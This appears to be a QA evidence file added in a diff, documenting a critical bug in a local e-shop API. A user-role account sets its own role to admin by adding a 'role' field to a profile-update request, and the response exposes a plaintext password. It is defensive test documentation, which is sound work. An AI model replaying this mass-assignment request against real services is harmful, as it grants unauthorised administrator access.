@@ -1,0 +1,21 @@
+Evidence for BUG-04-004 / TC-04-EP-005 — FR-04 role injection (CRITICAL)
+Captured: 2026-07-04, via curl (Model C). DB reseeded before this run.
+
+POST http://localhost:3000/api/login
+Body: {"email":"test@eshop.com","password":"Test1234!"}
+Response 200: {"token":"<JWT, role: user>", "user":{"id":2,"role":"user",...}}
+
+PUT http://localhost:3000/api/users/me
+Headers: Authorization: Bearer <token>   (token issued for a "user"-role account)
+Body: {"name":"Nguyen Van A","phone":"0912345678","shipping_address":"123 Le Loi","role":"admin"}
+Response 200: {"message":"Profile updated"}
+
+GET http://localhost:3000/api/users/me
+Headers: Authorization: Bearer <token>
+Response 200:
+{"id":2,"name":"Nguyen Van A","email":"test@eshop.com","password":"Test1234!","role":"admin","login_attempts":0,"locked_until":null,"reset_token":null,"shipping_address":"123 Le Loi","phone":"0912345678"}
+
+Observation: a plain "user"-role account successfully changed its own `role` to "admin" by
+including a `role` field in the profile-update request body. Direct violation of
+README.md line 67 and SEC-06 (line 283). DB was reseeded immediately after this test to
+remove the elevated-privilege row from the dev database.
